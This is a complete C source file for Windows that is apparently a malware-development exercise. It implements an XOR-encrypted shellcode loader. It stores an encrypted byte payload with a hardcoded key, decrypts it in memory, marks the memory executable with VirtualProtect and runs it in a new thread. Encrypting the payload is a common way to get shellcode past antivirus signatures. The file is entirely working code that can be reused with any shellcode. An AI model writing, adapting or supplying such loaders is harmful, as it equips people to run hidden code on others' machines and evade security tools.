
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>


void DecryptXOR(char * encrypted_data, size_t data_length, char * key, size_t key_length) {
	int key_index = 0;
	
	for (int i = 0; i < data_length; i++) {
		if (key_index == key_length - 1) key_index = 0;

		encrypted_data[i] = encrypted_data[i] ^ key[key_index];
		key_index++;
	}
}

int main(void) {
    
	void * alloc_mem;
	BOOL retval;
	HANDLE threadHandle;
    DWORD oldprotect = 0;

	unsigned char payload[] = { 0x8f, 0x2d, 0xe0, 0x96, 0x95, 0x9c, 0xb8, 0x6f, 0x72, 0x6b, 0x24, 0x28, 0x32, 0x35, 0x31, 0x23, 0x33, 0x3c, 0x49, 0xbd, 0x17, 0x23, 0xee, 0x2b, 0x13, 0x2d, 0xe8, 0x20, 0x7d, 0x3c, 0xf3, 0x3d, 0x52, 0x23, 0xee, 0xb, 0x23, 0x2d, 0x6c, 0xc5, 0x2f, 0x3e, 0x35, 0x5e, 0xbb, 0x23, 0x54, 0xb9, 0xdf, 0x59, 0x2, 0xe, 0x67, 0x58, 0x58, 0x2e, 0xb3, 0xa2, 0x68, 0x38, 0x72, 0xa4, 0x81, 0x9f, 0x37, 0x35, 0x29, 0x27, 0xf9, 0x39, 0x45, 0xf2, 0x31, 0x59, 0x2b, 0x73, 0xb5, 0xff, 0xf8, 0xe7, 0x72, 0x6b, 0x65, 0x31, 0xf6, 0xa5, 0x17, 0x15, 0x2d, 0x75, 0xa8, 0x3f, 0xf9, 0x23, 0x7d, 0x3d, 0xf8, 0x25, 0x43, 0x3b, 0x64, 0xa4, 0x9b, 0x39, 0x3a, 0x94, 0xac, 0x38, 0xf8, 0x51, 0xeb, 0x3a, 0x64, 0xa2, 0x35, 0x5e, 0xbb, 0x23, 0x54, 0xb9, 0xdf, 0x24, 0xa2, 0xbb, 0x68, 0x35, 0x79, 0xae, 0x4a, 0x8b, 0x10, 0x88, 0x3f, 0x66, 0x2f, 0x56, 0x6d, 0x31, 0x41, 0xbe, 0x7, 0xb3, 0x3d, 0x3d, 0xf8, 0x25, 0x47, 0x3b, 0x64, 0xa4, 0x1e, 0x2e, 0xf9, 0x67, 0x2d, 0x3d, 0xf8, 0x25, 0x7f, 0x3b, 0x64, 0xa4, 0x39, 0xe4, 0x76, 0xe3, 0x2d, 0x78, 0xa3, 0x24, 0x3b, 0x33, 0x3d, 0x2a, 0x21, 0x35, 0x33, 0x33, 0x24, 0x20, 0x32, 0x3f, 0x2b, 0xf1, 0x89, 0x54, 0x39, 0x3d, 0x8d, 0x8b, 0x3d, 0x38, 0x2a, 0x3f, 0x2b, 0xf9, 0x77, 0x9d, 0x2f, 0x90, 0x8d, 0x94, 0x38, 0x31, 0xc9, 0x64, 0x63, 0x72, 0x65, 0x74, 0x78, 0x6f, 0x72, 0x23, 0xe8, 0xf4, 0x72, 0x64, 0x63, 0x72, 0x24, 0xce, 0x49, 0xe4, 0x1d, 0xec, 0x9a, 0xac, 0xc8, 0x85, 0x7e, 0x58, 0x6f, 0x35, 0xc2, 0xc9, 0xe7, 0xd6, 0xf8, 0x86, 0xa6, 0x2d, 0xe0, 0xb6, 0x4d, 0x48, 0x7e, 0x13, 0x78, 0xeb, 0x9e, 0x99, 0x6, 0x60, 0xd8, 0x35, 0x76, 0x6, 0x17, 0x5, 0x72, 0x32, 0x24, 0xf0, 0xa9, 0x9a, 0xb6, 0x1c, 0xa, 0x0, 0x1d, 0x1f, 0x13, 0xf, 0x4b, 0x1c, 0xb, 0x0, 0x63 };



	unsigned int payload_length = sizeof(payload);
	char encryption_key[] = "secretxorkey";

	// Allocate new memory buffer for payload
	alloc_mem = VirtualAlloc(0, payload_length, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	printf("%-20s : 0x%-016p\n", "payload addr", (void *)payload);
	printf("%-20s : 0x%-016p\n", "alloc_mem addr", (void *)alloc_mem);

	printf("\n[1] Press Enter to Decrypt XOR Payload\n");
	getchar();

	// Decrypt the XOR payload to Original Shellcode
	DecryptXOR((char *)payload, payload_length, encryption_key, sizeof(encryption_key));
	
	// Copy the decrypted payload to allocated memory
	RtlMoveMemory(alloc_mem, payload, payload_length);
	
	// Set the newly allocated memory to be executable
	retval = VirtualProtect(alloc_mem, payload_length, PAGE_EXECUTE_READ, &oldprotect);

	printf("\n[2] Press Enter to Create Thread\n");
	getchar();

	// If VirtualProtect succeeded, run the thread that contains the shellcodePayload
	if ( retval != 0 ) {
			threadHandle = CreateThread(0, 0, (LPTHREAD_START_ROUTINE) alloc_mem, 0, 0, 0);
			WaitForSingleObject(threadHandle, -1);
	}

	return 0;
}
